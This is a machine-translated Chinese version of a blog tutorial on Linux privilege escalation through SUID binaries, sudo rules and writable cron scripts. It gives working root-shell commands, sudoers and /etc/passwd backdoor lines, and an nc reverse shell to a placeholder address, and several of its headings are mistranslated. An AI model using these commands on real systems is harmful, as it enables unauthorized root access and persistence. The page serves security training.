<html>
<head>
<title>Linux Privilege Escalation — Three Easy Ways to Get a Root Shell</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Linux权限提升——获得根Shell的三种简单方法</h1>
<blockquote>原文：<a href="https://medium.com/codex/linux-privilege-escalation-three-easy-ways-to-get-a-root-shell-255a71fcf2a0?source=collection_archive---------9-----------------------#2021-07-30">https://medium.com/codex/linux-privilege-escalation-three-easy-ways-to-get-a-root-shell-255a71fcf2a0?source=collection_archive---------9-----------------------#2021-07-30</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><p id="b795" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">一旦你获得了对一个<strong class="ih hj"> Linux </strong>系统的访问权，下一个合乎逻辑的步骤就是执行<strong class="ih hj">权限提升</strong>。也就是说，从具有有限权限的用户帐户变为具有全部权限的超级用户帐户。</p><p id="c585" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">有许多选项可以帮助您实现这一点，从简单易行的技术到更高级但不太容易执行的更复杂的技术。在本文中，我们将探索您可以使用的三个最简单的选项。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div class="er es jd"><img src="../Images/589879fb1aa19a525253e895ee060487.png" data-original-src="https://miro.medium.com/v2/resize:fit:1040/format:webp/0*XJ7CU7qfsQVY3uTY.jpg"/></div></figure><p id="a6f7" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这里列出的技术都是唾手可得的，你可以先检查一下。只有在所有这些选择都失败后，你才能尝试更先进的技术。</p><p id="cc12" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">根据目标主机的安全配置，其中一些技术可能不起作用。但有时，管理员的一个错误就足以让您找到根。</p></div><div class="ab cl jl jm gp jn" role="separator"><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq"/></div><div class="hb hc hd he hf"><h1 id="94f6" class="js jt hi bd ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp bi translated">SUID双星</h1><p id="59b5" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">一个<strong class="ih hj"> SUID </strong>是某些可执行文件可能拥有的特殊权限。当文件设置了SUID位时，用户可以使用与其所有者相同的权限执行该文件。</p><p id="fef1" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">SUID二进制文件由文件权限第四位的“s”字符标识。正如您在下面看到的，'<em class="kv"> passwd </em>'文件是一个SUID二进制文件。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div class="er es kw"><img src="../Images/63e456ee175894321f607d45f5b54380.png" data-original-src="https://miro.medium.com/v2/resize:fit:1204/format:webp/0*hCQ89He6rrO_37fb.png"/></div></figure><p id="f8d8" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">您可以看到我们如何利用这一点，尝试通过root用户或拥有更高权限的用户拥有的SUID二进制文件生成一个shell。</p><h2 id="574b" class="kx jt hi bd ju ky kz la jy lb lc ld kc iq le lf kg iu lg lh kk iy li lj ko lk bi translated">利用SUID二进制文件</h2><p id="3356" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">易受攻击的SUID二进制文件的一个例子是'<em class="kv"> python </em>'命令。如果您发现与此命令相关联的二进制文件上设置了SUID位，那么您可以通过运行以下命令轻松执行权限提升:</p><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="a5a1" class="kx jt hi lm b fi lq lr l ls lt">$ ./python -c 'import os;os.system("/bin/sh -p")'</span></pre><p id="ea63" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">当然，您应该首先将当前目录更改为python二进制文件所在的位置。</p><p id="2293" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">如果成功，您将获得一个提升权限的外壳。您可以通过执行'<em class="kv"> whoami' </em>命令来验证这一点。</p><p id="3daf" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">这里提供的<em class="kv"> python </em>命令只是作为一个例子，帮助您更好地掌握这项技术。因此，您不应该期望它在您的目标主机上被配置为SUID二进制文件，因此，上面的命令可能不起作用。</p><p id="0952" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">但是，您可以做的和应该做的第一件事是在系统上搜索所有SUID二进制文件。为此，您可以运行下面的<a class="ae lu" href="https://patchthenet.com/tutorials/linux/chapter-6-find-files-in-linux/" rel="noopener ugc nofollow" target="_blank"> find </a>命令:</p><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="99ae" class="kx jt hi lm b fi lq lr l ls lt">find / -type f -perm -u=s 2&gt;/dev/null</span></pre><p id="040b" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">一旦您有了所有SUID二进制文件的列表，您就可以访问<a class="ae lu" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> GTFOBins </a>来检查那些容易受到特权提升攻击的文件。该网站还将为您提供运行每个易受攻击的SUID二进制文件的确切命令。</p><p id="f8fb" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">GTFOBins是一个非常好的Linux权限提升资源。您应该将它保存在您的书签中，因为您将来在Linux系统上尝试权限提升时肯定会用到它。</p></div><div class="ab cl jl jm gp jn" role="separator"><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq"/></div><div class="hb hc hd he hf"><h1 id="b003" class="js jt hi bd ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp bi translated">SUDO司令部</h1><p id="b6de" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">要以root用户身份运行一个命令，通常需要在实际命令之前先输入'<em class="kv"> sudo </em>'。</p><p id="5253" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">然而，并不是每个用户都有权运行<strong class="ih hj"> SUDO </strong>。用户对该命令的具体权限存储在<em class="kv"> /etc/sudoers </em>中。该文件列出了用户可以使用SUDO运行的命令。它还指定他们是否需要密码才能这样做。</p><h2 id="e067" class="kx jt hi bd ju ky kz la jy lb lc ld kc iq le lf kg iu lg lh kk iy li lj ko lk bi translated">剥削SUDO</h2><p id="9fce" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">您可以使用以下命令检查当前用户的权限:</p><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="bea2" class="kx jt hi lm b fi lq lr l ls lt">$ sudo -l<br/>user ALL=(ALL) NOPASSWD:ALL</span></pre><p id="4a39" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">如果这个命令的输出类似于上面的内容，那么您非常幸运，因为这一行授予您使用SUDO运行任何命令的权限，而无需提供密码。</p><p id="864d" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">但是老实说，这在现实世界中太容易发生了，除了一些容易入门的CTF。</p><p id="104c" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">另一方面，您可能会更经常地发现类似如下的内容:</p><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="2a0c" class="kx jt hi lm b fi lq lr l ls lt">(root) NOPASSWD: /usr/bin/find</span></pre><p id="c588" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">在这种情况下，您只能用<em class="kv"> find </em>命令运行SUDO，并且您仍然不需要密码。</p><p id="1831" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">你可能认为<em class="kv"> find </em>在你寻求特权的过程中不会有太大的帮助。嗯，……在这种情况下，你就错了。其实，<em class="kv">找</em>绰绰有余。</p><p id="e3ed" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">如果我们引用<a class="ae lu" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> GTFOBins </a>，我们可以使用<em class="kv"> find </em>获得完整的命令来生成shell:</p><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="7562" class="kx jt hi lm b fi lq lr l ls lt">sudo find . -exec /bin/sh \; -quit</span></pre><p id="6885" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">我在这里提供find作为一个例子。这对于许多其他命令也是有效的。您可以检查GTFOBins，看看哪些容易受到这种技术的攻击，以及如何使用每个GTFOBins来获得根shell。</p></div><div class="ab cl jl jm gp jn" role="separator"><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq"/></div><div class="hb hc hd he hf"><h1 id="c1b6" class="js jt hi bd ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp bi translated">克朗·乔布斯</h1><p id="5242" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">Cron是一个运行在大多数Linux系统上的任务调度程序，类似于Windows中的任务调度程序。它允许用户安排某些程序和脚本定期运行，而不必手动执行它们。</p><p id="b1dc" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">Cron在自动化任务方面非常有用，例如运行恶意软件扫描、检查更新或创建定期备份。</p><p id="226a" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">然而，从攻击者的角度来看，如果配置不当，Cron可能是权限提升的潜在媒介。让我们看看我们能做些什么。</p><p id="3cef" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">Cron可以使用某些名为“crontabs”的文件进行定制。这些文件告诉Cron要执行什么作业以及何时执行。</p><p id="8c1d" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">每个作业都在一行中定义，第一组列指定它应该运行的时间，最后一列指定要执行的命令或程序路径。</p><figure class="je jf jg jh fd ji er es paragraph-image"><div role="button" tabindex="0" class="lw lx di ly bf lz"><div class="er es lv"><img src="../Images/a0736189e9279503213b8ce3d6b44134.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*iN-FVuZ8w5Sdr2In.png"/></div></div></figure><p id="ec0e" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">一个特殊的Crontab位于/etc/crontab，用于调度系统范围的作业。该文件中安排的所有作业都由Cron以root权限执行。</p><h2 id="f827" class="kx jt hi bd ju ky kz la jy lb lc ld kc iq le lf kg iu lg lh kk iy li lj ko lk bi translated">剥削Cron工作</h2><p id="244a" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">如果我们使用<em class="kv"> cat </em>查看<em class="kv"> /etc/crontab </em>的内容，并且我们发现当前用户可以写一个脚本，那么我们可以修改它来做各种事情来提升我们的权限。</p><p id="ea22" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">例如，假设您有一个包含以下行的crontab文件:</p><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="6c0e" class="kx jt hi lm b fi lq lr l ls lt">*/5 * * * * root /writable/script.sh</span></pre><p id="f530" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated">按照这一行，<em class="kv"> script.sh </em>每5分钟运行一次。您在该文件中添加的任何命令都将以root用户身份执行。我们可以从这里开始有许多方法:</p><ul class=""><li id="088e" class="ma mb hi ih b ii ij im in iq mc iu md iy me jc mf mg mh mi bi translated">您可以在sudoers文件中添加一行，授予当前用户在没有密码的情况下运行SUDO的权限。</li></ul><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="7a85" class="kx jt hi lm b fi lq lr l ls lt">echo "user ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers</span></pre><ul class=""><li id="8297" class="ma mb hi ih b ii ij im in iq mc iu md iy me jc mf mg mh mi bi translated">或者，您可以通过连接回攻击机器上的侦听器来生成反向shell。</li></ul><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="590b" class="kx jt hi lm b fi lq lr l ls lt">nc &lt;IP-Address&gt; &lt;Port&gt; -e /bin/sh</span></pre><ul class=""><li id="d118" class="ma mb hi ih b ii ij im in iq mc iu md iy me jc mf mg mh mi bi translated">您甚至可以在<em class="kv"> /etc/passwd </em>中添加一个新的root用户，方法是提供一个UID值0 (UID是第三个字段，与root相关联)。</li></ul><pre class="je jf jg jh fd ll lm ln lo aw lp bi"><span id="32e7" class="kx jt hi lm b fi lq lr l ls lt">echo "newRoot::0:0:newRoot:/home/newRoot:/bin/sh" &gt;&gt; /etc/passwd</span></pre></div><div class="ab cl jl jm gp jn" role="separator"><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq"/></div><div class="hb hc hd he hf"><h1 id="8a92" class="js jt hi bd ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp bi translated">结论</h1><p id="909f" class="pw-post-body-paragraph if ig hi ih b ii kq ik il im kr io ip iq ks is it iu kt iw ix iy ku ja jb jc hb bi translated">Linux权限提升不是一件容易的事情。应用这些技术并不总是像这里介绍的那样简单。有时候，它们都不起作用。但这是一件好事，因为这将推动你探索新的技术，这些技术将被证明是有用的，而其他人不会。</p></div><div class="ab cl jl jm gp jn" role="separator"><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq jr"/><span class="jo bw bk jp jq"/></div><div class="hb hc hd he hf"><p id="b86c" class="pw-post-body-paragraph if ig hi ih b ii ij ik il im in io ip iq ir is it iu iv iw ix iy iz ja jb jc hb bi translated"><em class="kv">原载于2021年7月30日https://patchthenet.com</em><em class="kv">的</em> <a class="ae lu" href="https://patchthenet.com/articles/linux-privilege-escalation-three-easy-ways-to-get-a-root-shell/" rel="noopener ugc nofollow" target="_blank"> <em class="kv">。</em></a></p></div></div>    
</body>
</html>